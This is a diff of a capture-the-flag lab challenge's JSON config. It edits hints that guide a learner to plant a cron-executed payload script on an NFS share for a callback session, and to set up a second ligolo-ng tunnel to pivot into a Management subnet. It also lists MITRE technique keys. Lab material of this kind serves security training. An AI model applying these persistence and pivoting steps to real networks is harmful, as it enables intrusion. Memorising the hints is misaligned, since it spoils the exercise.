+      "title" : "Don't Panic at the Noise",
+      "content" : "Once the cron job fires, it keeps firing on its own schedule — every run after the first one will show up as a rejected \"duplicate\" connection on the console. That's not a failure. Look for the first successful \"Agent joined\" line, then explicitly pick that new session.",
+      "hint_penalty" : 6,
       "order" : 2
+    }, {
+      "title" : "If Nothing Shows Up At All",
+      "content" : "No new session after a couple of minutes usually means the write didn't take, or the file isn't executable. Read the file back (cat /mnt/nfs/.sync-check.sh) to confirm your payload actually landed, and double-check chmod 755 was applied — cron won't run a script it can't execute.",
+      "hint_penalty" : 8,
+      "order" : 3
+    }, {
+      "title" : "Two Tunnels, Two Names",
+      "content" : "ligolo-ng won't let two sessions share the same interface name. Since `ligolo` is already up from your first pivot, starting the second session the same way will fail with \"a tunnel is already using this interface name.\" Give it its own name with `--tun`, and route the Management subnet through that specific interface — not the original one.",
+      "hint_penalty" : 4,
+      "order" : 1
     } ],
     "incorrect_answer_limit" : 6,
     "attachments" : [ ],
@@ -222,11 +217,11 @@
     "variant_answers" : true,
     "reference_solution" : [ ],
     "mitre_techniques" : [ {
-      "technique_key" : "TA0007.T1046"
-    }, {
       "technique_key" : "TA0011.T1572"
     }, {
       "technique_key" : "TA0004.T1053"
+    }, {
+      "technique_key" : "TA0007.T1046"
     } ],
     "expected_commands" : [ "curl", "ip", "ligolo" ],
     "commands_required" : false
